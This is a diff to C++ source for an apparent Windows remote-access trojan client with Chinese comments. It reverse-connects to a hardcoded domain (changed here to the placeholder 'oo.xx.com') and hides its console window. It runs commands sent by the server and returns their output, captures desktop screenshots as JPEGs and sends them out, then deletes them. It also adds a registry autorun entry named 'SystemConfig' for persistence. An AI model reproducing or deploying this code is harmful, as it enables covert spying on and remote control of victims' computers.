@@ -4,17 +4,21 @@
 #include <windows.h>
 #include <winable.h>
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "libjpeg/jpeg.lib")
+extern "C" {
+    #include "jpeglib.h"  
+}
 
-/*
 #ifdef _MSC_VER  
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
-*/
 
 #define MSG_LEN 1024
+#define MSG_LENN 5120
+
 
 int ServerPort = 8083;  //连接的端口
-char ServerAddr[] = "test.s0nnet.com"; //反弹连接的域名
+char ServerAddr[] = "oo.xx.com"; //反弹连接的域名
 int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);
 
 
@@ -24,7 +28,7 @@ int sendFile(SOCKET client, char *filename)
     char sendbuf[1024];
     DWORD        dwRead;  
     BOOL         bRet;
-	Sleep(500);
+	Sleep(200);
 
     HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if(hFile==INVALID_HANDLE_VALUE) {
@@ -34,7 +38,7 @@ int sendFile(SOCKET client, char *filename)
         bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
         if(bRet==FALSE) break;
         else if(dwRead==0) {
-			Sleep(200);
+			Sleep(100);
             break;  
         } else {  
             send(client,sendbuf,dwRead,0);
@@ -42,8 +46,8 @@ int sendFile(SOCKET client, char *filename)
     }
 	send(client,"EOFYY",strlen("EOFYY")+1,0);
     CloseHandle(hFile);
-	if (strcmp(filename,"screen.png")==0) {
-		system("del screen.png");
+	if (strcmp(filename,"screen.jpg")==0) {
+		system("del screen.jpg");
 	}
 	
 	return 0;
@@ -84,7 +88,7 @@ int cmd(char *cmdStr, char *message)
 {
     DWORD readByte = 0;
     char command[1024] = {0};
-    char buf[MSG_LEN] = {0}; //缓冲区
+    char buf[MSG_LENN] = {0}; //缓冲区
  
     HANDLE hRead, hWrite;
     STARTUPINFO si;         // 启动配置信息
@@ -97,7 +101,7 @@ int cmd(char *cmdStr, char *message)
     sa.lpSecurityDescriptor = NULL;
  
     // 创建匿名管道，管道句柄是可被继承的
-    if( !CreatePipe(&hRead, &hWrite, &sa, 1024)) {
+	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
         return 1;
     }
  
@@ -113,24 +117,102 @@ int cmd(char *cmdStr, char *message)
  
     // 创建子进程,运行命令,子进程是可继承的
     if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
-        //printf( "Create Process Error: %x\n", (unsigned int)GetLastError());
         CloseHandle( hRead );
         CloseHandle( hWrite );
+		printf("error!");
         return 1;
     }
     CloseHandle( hWrite );
   
     //读取管道的read端,获得cmd输出
-    while (ReadFile( hRead, buf, MSG_LEN, &readByte, NULL )) {
+    while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
         strcat(message, buf);
-        ZeroMemory( buf, MSG_LEN );
+        ZeroMemory( buf, MSG_LENN );
     }
     CloseHandle( hRead );
 
     return 0;
 }
 
-
+//bmp转jpg算法
+int bmptojpg24x(const char *strSourceFileName, const char *strDestFileName, int quality)  
+{  
+    BITMAPFILEHEADER bfh;       // bmp文件头  
+    BITMAPINFOHEADER bih;       // bmp头信息  
+    RGBQUAD rq[256];            // 调色板  
+    int i=0;  
+  
+    BYTE *data= NULL;//new BYTE[bih.biWidth*bih.biHeight];  
+    BYTE *pData24 = NULL;//new BYTE[bih.biWidth*bih.biHeight];  
+    int nComponent = 0;  
+  
+    // 打开图像文件  
+    FILE *f = fopen(strSourceFileName,"rb");  
+    if (f==NULL) {
+        return 1;  
+    }  
+    // 读取文件头和图像信息 
+    fread(&bfh,sizeof(bfh),1,f);
+	fread(&bih,sizeof(bih),1,f); 
+    
+	data= new BYTE[bih.biWidth*bih.biHeight*4];  
+    pData24 = new BYTE[bih.biWidth*bih.biHeight*3];  
+    fseek(f,bfh.bfOffBits,SEEK_SET);      
+    fread(data,bih.biWidth*bih.biHeight*4,1,f);  
+    fclose(f);  
+    for (i = 0;i<bih.biWidth*bih.biHeight;i++) {
+        pData24[i*3] = data[i*4+2];  
+        pData24[i*3+1] = data[i*4+1];  
+        pData24[i*3+2] = data[i*4];  
+     }  
+     nComponent = 3;
+  
+    // 以上图像读取完毕  
+    struct jpeg_compress_struct jcs;  
+    struct jpeg_error_mgr jem;  
+    jcs.err = jpeg_std_error(&jem);  
+  
+    jpeg_create_compress(&jcs);  
+  
+    f=fopen(strDestFileName,"wb");  
+    if (f==NULL) {
+        delete [] data;  
+        return 1;  
+    }  
+    jpeg_stdio_dest(&jcs, f);  
+    jcs.image_width = bih.biWidth;          // 为图的宽和高，单位为像素   
+    jcs.image_height = bih.biHeight;  
+    jcs.input_components = nComponent;          // 1,表示灰度图， 如果是彩色位图，则为3   
+    if (nComponent==1)  
+        jcs.in_color_space = JCS_GRAYSCALE; //JCS_GRAYSCALE表示灰度图，JCS_RGB表示彩色图像   
+    else   
+        jcs.in_color_space = JCS_RGB;  
+  
+    jpeg_set_defaults(&jcs);      
+    jpeg_set_quality (&jcs, quality, true);  
+    jpeg_start_compress(&jcs, TRUE);  
+ 
+    JSAMPROW row_pointer[1];            // 一行位图  
+    int row_stride;                     // 每一行的字节数   
+  
+    row_stride = jcs.image_width*nComponent; // 如果不是索引图,此处需要乘以3  
+  
+    // 对每一行进行压缩  
+    while (jcs.next_scanline < jcs.image_height) {  
+        row_pointer[0] = & pData24[(jcs.image_height-jcs.next_scanline-1) * row_stride];  
+        jpeg_write_scanlines(&jcs, row_pointer, 1);  
+    }  
+  
+    jpeg_finish_compress(&jcs);  
+    jpeg_destroy_compress(&jcs);  
+  
+    fclose(f);  
+    delete [] data;  
+    delete [] pData24;  
+  
+	system("del screen.bmp");
+    return 0;
+} 
 
 // 屏幕截屏
 int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
@@ -202,7 +284,7 @@ int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
     );
  
  
-    wsprintf(FilePath, "%s\\%s.png", dirPath, filename);
+    wsprintf(FilePath, "%s\\%s.bmp", dirPath, filename);
  
     // 创建一个文件来保存文件截图
     hFile = CreateFile(
@@ -244,6 +326,9 @@ done:
     DeleteObject(hbmScreen);
     DeleteObject(hdcMemDC);
     ReleaseDC(NULL, hdcScreen);
+
+	Sleep(200);
+	bmptojpg24x("screen.bmp", "screen.jpg", 50);
  
     return 0;
 }
@@ -311,7 +396,7 @@ void c_socket()
 
 	//阻塞等待服务端指令
 	char recvCmd[MSG_LEN] = {0};
-	char message[MSG_LEN] = {0};
+	char message[MSG_LENN+10] = {0};
 	while(1) {
 		ZeroMemory(recvCmd, sizeof(recvCmd));
 		ZeroMemory(message,sizeof(message));
@@ -345,8 +430,8 @@ void c_socket()
 			send(client,"Client has exit!", 18, 0);
 			exit(0);
 		}else if(strcmp(recvCmd,"screenshot")==0){  //截屏
-			CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.png
-			sendFile(client,"screen.png");
+			CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.jpg
+			sendFile(client,"screen.jpg");
 			continue;
 		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
 			int i;
@@ -427,11 +512,11 @@ int autoRun(char *path)
     // 在注册表中设置(没有则会新增一个值)
     result = RegSetValueEx(
                  hKey,
-                 "SYSTEM CONFIG", // 键名
+                 "SystemConfig", // 键名
                  0,                  // 保留参数必须填 0
                  REG_SZ,             // 键值类型为字符串
                  (const unsigned char *)path, // 字符串首地址
-                 sizeof(path)        // 字符串长度
+                 strlen(path)        // 字符串长度
              );
 
     if (result != ERROR_SUCCESS) return 0;
